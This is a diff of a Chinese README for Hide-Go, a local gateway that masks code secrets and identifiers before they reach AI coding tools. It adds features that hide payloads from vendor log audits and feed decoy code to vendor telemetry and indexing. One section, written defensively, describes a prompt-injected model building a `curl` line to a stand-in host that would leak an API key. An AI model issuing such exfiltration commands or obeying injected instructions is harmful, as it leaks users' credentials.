@@ -77,14 +77,14 @@ pub fn verify_margin_liquidation(
 <td>
 
 ```rust
-// [BotanicalSensor-01] Calibrate greenhouse soil humidity
-// 路径: /workspace/sandbox_proj/src/module_01.rs
-pub fn check_orchid_soil_moisture(
-    terrarium_sensor_id: &str,
+// GreenhouseApp_01 HFT 核心清算模块
+// 路径: /workspace/user_01/GreenhouseApp_01/src/pay.rs
+pub fn compost_magnolia_766(
+    nectar_foliage_130: &str,
 ) -> bool {
-    let db = "postgres://db_user_01:pass_01@10.254.0.2:5432/app_01";
+    let db = "postgres://db_user_01:db_pass_placeholder_01@db-01.example.internal:5432/app_schema_01";
     let key = "sk-sem-placeholder-key-0001";
-    compute_foliage_hydration_index(terrarium_sensor_id, db, key)
+    chlorophyll_bamboo_186(nectar_foliage_130, db, key)
 }
 ```
 
@@ -92,18 +92,21 @@ pub fn check_orchid_soil_moisture(
 </tr>
 </table>
 
+> 右栏是网关的实际输出（本机实测，未经改写）。伪装名由项目 Salt 哈希得出，而 Salt 每次安装随机生成，所以你自己跑出来的名字会不同；`ProjectTitan` 被替换是因为默认配置里带了一条示例自定义规则。
+
 > **为什么模型还能正常改代码？**
-> 因为 `pub fn`、参数类型、返回值和调用关系（AST 结构）完全没变。模型顺着“兰花土壤湿度”帮你修好逻辑并发回 SSE 数据流时，Hide-Go 的 `StreamRestorer` 会在本地把 `check_orchid_soil_moisture` 实时换回 `verify_margin_liquidation`。
+> 因为 `pub fn`、参数类型、返回值和调用关系（AST 结构）完全没变。模型顺着“兰花土壤湿度”帮你修好逻辑并发回数据流时，Hide-Go 会在本地把 `compost_magnolia_766` 实时换回 `verify_margin_liquidation`——SSE 流式响应走 `SseRestorer`，普通 JSON 响应走 `restore`，两条路径结果一致。
 
 ---
 
-## All-Hide 的三个子开关
+## All-Hide 的四个子开关
 
-除了把标识符映射成其它行业词表，All-Hide 面板里还可以单独组合下面三项：
+除了把标识符映射成其它行业词表，All-Hide 面板里还可以单独组合下面四项：
 
-* 🌱 **同构领域伪装（Isomorphic Camouflage）**：内置 `植物园温室管理`、`公共图书馆编目`、`烘焙坊温控配方` 三套词库，按项目 Salt 确定性哈希映射函数名、结构体、变量和注释。
-* ⠿ **高熵盲文乱码（Cipher Garble）**：把载荷用动态异或加盲文点阵块编码成 `⟦HIDE-CIPHER::⠷⠩⡬⡺⢵⣑⡬...⟧`，专门对付厂商侧的明文日志审计与正则爬虫，返回本地时自动解码。
-* 🎭 **静默遥测与索引投毒（Telemetry & Indexing Chaff）**：很多 IDE 一旦直接封死遥测或 `repo-indexing` 接口就会弹窗报错。开启后，Hide-Go 遇到后台静默上传请求时，会现场生成一份体积相近的假代码喂给厂商，既防泄露又不报错。
+* 🔤 **字符串字面量掩码（Strict Literal Masking，默认开启）**：把代码中引号包裹的字面量替换为 `<<HIDE_STR_001>>` 形式的占位符，响应返回时还原；自然语言提示词不受影响。
+* 🌱 **同构领域伪装（Isomorphic Camouflage，默认开启）**：内置 `植物园温室管理`、`公共图书馆编目`、`烘焙坊温控配方` 三套词库，按项目 Salt 确定性哈希映射 snake_case / camelCase / PascalCase 复合标识符与行尾 `//` 注释。普通英文单词和自然语言提示词保持原样，工具定义、调用 ID 与请求结构不加改写，请求始终是合法的 API 调用。
+* ⠿ **高熵盲文乱码（Cipher Garble，默认关闭）**：把载荷加密成 `⟦HIDE-CIPHER::⠷⠩⡬⡺⢵⣑⡬...⟧` 盲文点阵块，厂商侧的明文日志审计与正则爬虫只能看到乱码。代价是**模型自己也读不懂这段内容**，只适合需要原样回传、不需要模型理解的数据。
+* 🎭 **静默遥测与索引投毒（Telemetry & Indexing Chaff，默认开启）**：遥测请求不再离开本机，网关直接返回成功响应；后台代码索引上传保留原有 JSON 结构与大致相当的体积，内容整段换成诱饵代码。识别只依据**请求路径**，`/v1/messages`、`/chat/completions` 这类推理接口永远不会被当成遥测拦截。
 
 ---
 
@@ -130,20 +133,28 @@ pub fn check_orchid_soil_moisture(
 export ANTHROPIC_BASE_URL="http://127.0.0.1:18787/claude-code"
 
 # OpenAI Codex
-export OPENAI_BASE_URL="http://127.0.0.1:18787/codex"
+export OPENAI_BASE_URL="http://127.0.0.1:18787/codex/v1"
 
 # Grok Build
-export XAI_BASE_URL="http://127.0.0.1:18787/grok-build"
+export XAI_BASE_URL="http://127.0.0.1:18787/grok-build/v1"
 ```
 
 **Windows (PowerShell)**
 ```powershell
 $env:ANTHROPIC_BASE_URL = "http://127.0.0.1:18787/claude-code"
-$env:OPENAI_BASE_URL    = "http://127.0.0.1:18787/codex"
-$env:XAI_BASE_URL       = "http://127.0.0.1:18787/grok-build"
+$env:OPENAI_BASE_URL    = "http://127.0.0.1:18787/codex/v1"
+$env:XAI_BASE_URL       = "http://127.0.0.1:18787/grok-build/v1"
 ```
 
 </details>
+
+> **接入限制**：Hide-Go 是反向代理网关，不是 HTTPS 正向代理，**不能通过 `HTTPS_PROXY` 接入**（网关不支持 CONNECT，那样只会让你终端里的 HTTPS 请求全部失败）；工具必须支持自定义 API Base URL。另外两个已知边界：
+> * **Cursor** 的自定义 Base URL 请求由 Cursor 服务器转发，访问不到你本机的 `127.0.0.1`，需要自行用 HTTPS 隧道把网关暴露出去，并自负暴露风险。
+> * **Qoder** 的内置索引通道若不读取 Base URL 变量，那部分请求不会经过网关。
+
+## 工具调用里的密钥默认只在写文件时还原
+
+模型发起的工具调用（Shell 命令、网络请求、文件写入）会在你本机执行。如果在这些参数里一律还原真实密钥，被提示注入的模型只要照着占位符拼一条 `curl https://x/?k=sk-sem-placeholder-key-0001`，本机执行的就是带真实 key 的命令。所以默认策略是：**只在写入或编辑文件的内容字段里还原，命令行与 URL 中保持占位符**；需要真实密钥的命令请改用环境变量。可在「保护策略 → 工具调用中的凭据」中改为「始终保留占位符」或「全部还原」。普通文本回复里的占位符始终会还原，路径、内网地址等非凭据数据不受这项设置影响。
 
 ---
 
@@ -162,6 +173,22 @@ $env:XAI_BASE_URL       = "http://127.0.0.1:18787/grok-build"
   ```
 
 运行后会自动监听 `127.0.0.1:18787` 并拉起桌面控制台窗口。如果只想在服务器后台跑纯网关守护进程，加环境变量 `HIDE_GO_HEADLESS=1` 即可。
+
+| 环境变量 | 作用 |
+| :--- | :--- |
+| `HIDE_GO_PORT` | 监听端口，默认取配置文件中的值（`18787`） |
+| `HIDE_GO_HEADLESS` | 设置后不拉起控制台窗口 |
+| `HIDE_GO_CONFIG` | 配置文件路径。默认是 `%APPDATA%\hide-go\config.json`（Windows）、`~/Library/Application Support/hide-go/config.json`（macOS）、`~/.config/hide-go/config.json`（Linux） |
+| `HIDE_GO_UPSTREAM_URL` | 把所有工具的上游改为自建或第三方兼容端点；单个请求也可以用 `X-Hide-Go-Upstream` 头覆盖 |
+| `HIDE_GO_ADMIN_TOKEN` | 固定管理 API 令牌；不设置则每次启动随机生成 |
+
+### 数据留在哪
+
+* 网关只监听 `127.0.0.1`，局域网里的其他设备访问不到。
+* **映射表**（占位符 ↔ 真实值）只存在于进程内存，退出即清空；最多 50,000 条，超出后淘汰最久未使用的条目。
+* **流量记录**同样只在内存里，保留最近 200 条。
+* 写入磁盘的只有配置文件：处理模式、自定义规则和项目 Salt。Salt 在首次运行时随机生成。
+* 管理 API 需要令牌，并校验 `Host` / `Origin` / `Sec-Fetch-Site`，用来挡 DNS 重绑定和跨站请求；令牌不放在 cookie 里。
 
 ---
 
@@ -182,14 +209,19 @@ cargo build --release -p hide-go-desktop
 
 ```text
 hide-go/
-├── crates/hide-core/          # Rust 核心引擎
-│   └── src/
-│       ├── scanner.rs         # 密钥、私钥、DB 连接串、内网 IP 与路径正则扫描
-│       ├── vault.rs           # 线程安全双向语义字典 (Token <-> 原文)
-│       ├── desensitizer.rs    # 格式保持假数据生成器
-│       ├── all_hide.rs        # 同构伪装词表、盲文乱码编码器、Chaff 生成器
-│       ├── stream_restorer.rs # SSE 流式滑动窗口跨 Chunk 边界还原器
-│       └── proxy.rs           # Axum 异步反向代理与沙箱仿真器
-├── src/                       # 桌面端 UI (四栏实时对照台、规则与保险箱管理)
-└── src-tauri/                 # 单文件静态资源内嵌与原生窗口启动器
+├── crates/hide-core/          # Rust 核心引擎与独立守护进程
+│   ├── src/
+│   │   ├── scanner.rs         # 密钥、私钥、DB 连接串、内网 IP、路径与自定义规则扫描
+│   │   ├── vault.rs           # 线程安全双向映射表 (占位符 <-> 原文)，带容量上限
+│   │   ├── desensitizer.rs    # 格式保持假数据生成器
+│   │   ├── all_hide.rs        # 同构伪装词表、字面量掩码、盲文加密、诱饵生成器
+│   │   ├── protocol.rs        # 各家协议中必须保持原样的字段（ID、枚举、签名块、工具 schema）
+│   │   ├── restore.rs         # JSON 响应还原与工具调用凭据策略
+│   │   ├── sse_restorer.rs    # 按协议分通道的 SSE 流式还原器
+│   │   ├── stream_restorer.rs # 跨 Chunk 边界的滑动窗口文本还原器
+│   │   ├── harness.rs         # 7 款工具的识别、路由与接入脚本
+│   │   └── proxy.rs           # Axum 反向代理、管理 API 与离线模拟器
+│   └── tests/                 # 代码审查问题的回归测试
+├── src/                       # 桌面端 UI（概览、流量检视、保护策略、自定义规则、映射表、工具接入）
+└── desktop/                   # 单文件静态资源内嵌与控制台窗口启动器
 ```
